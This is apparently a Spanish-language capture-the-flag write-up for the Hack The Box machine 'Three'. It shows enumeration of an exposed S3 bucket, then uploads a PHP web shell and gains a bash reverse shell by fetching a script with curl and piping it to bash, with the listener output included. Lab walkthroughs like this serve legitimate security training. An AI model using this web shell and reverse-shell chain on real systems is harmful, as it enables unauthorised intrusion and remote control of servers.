# HTB: Three

## Nmap:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration:

### subdomain enum:

```bash
gobuster vhost -w ~/Hacking/Wordlists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.129.112.182
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/_1nkn0wn_/Hacking/Wordlists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/08 00:43:36 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 502) [Size: 424]
Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]
                                                         
===============================================================
2022/10/08 00:46:33 Finished
===============================================================
```

Se encontro un s3 bucket {s3.thetoppers.htb}, al agregar el subdominio a /etc/hosts podremos ingresar a la pagina y visualizar {"status": "running"}

para poder interactuar con el servicio s3 buckets podemos utilizar la herramienta awscli 

utilizamos el comando ‘ls’ de awscli para listar objetos dentro del bucket 

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

resultado: 

```bash
PRE images/
2022-10-08 00:53:16          0 .htaccess
2022-10-08 00:53:16      11952 index.php
```

### Explotaition:

podemos visualizar que la pagina utiliza php como lenguaje de programacion, podemos utilizar el comando ‘cp’ de awscli para subir un archivo php malicioso como una shell para obtener ejecucion de comandos remota 

shell: 

```php
<?php system($_GET["cmd"]); ?>
```

aws command: 

```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp ./shell.php s3:http://thetoppers.htb
```

ahora podremos ingresar a [http://thetoppers.htb/shell.php](http://thetoppers.htb/shell.php) y a traves del parametro ?cmd={comando} verificar si conseguimos RCE 

utilizando el comando whoami podemos ver que tenemos el usuario www-data

![Untitled](HTB%20Three%202c5b56a00cd041b99cd718e822d60218/Untitled.png)

creamos un archivo [shell.sh](http://shell.sh) con codigo bash para realizar una reverse shell y lo servimos a traves de un servidor python http 

```bash
echo 'bash -i >& /dev/tcp/10.10.16.11/8080 0>&1' > shell.sh
```

```bash
python3 -m http.server 8000
```

luego utilizando el comando ‘curl’ en la maquina objetivo podremos descargar el archivo [shell.sh](http://shell.sh) y utilizando el operador “pipe” { | } le diremos que lo ejecute 

previamente nos pondremos en escucha utilizando NetCat 

```html
nc -lvnp 8080
```

```html
http://thetoppers.htb/shell.php?cmd=curl%20http://10.10.16.11:8000/shell.sh|bash
```

resultado: 

```bash
listening on [any] 8080 ...
connect to [10.10.16.11] from (UNKNOWN) [10.129.25.112] 58680
bash: cannot set terminal process group (1694): Inappropriate ioctl for device
bash: no job control in this shell
www-data@three:/var/www/html$ ls
ls
images
index.php
shell.php
shell.sh
www-data@three:/var/www/html$
```

### Flag:

utilizando el comando ‘locate’ podremos visualizar la Flag 

```bash
www-data@three:/$ locate flag.txt
locate flag.txt
/var/www/flag.txt
```
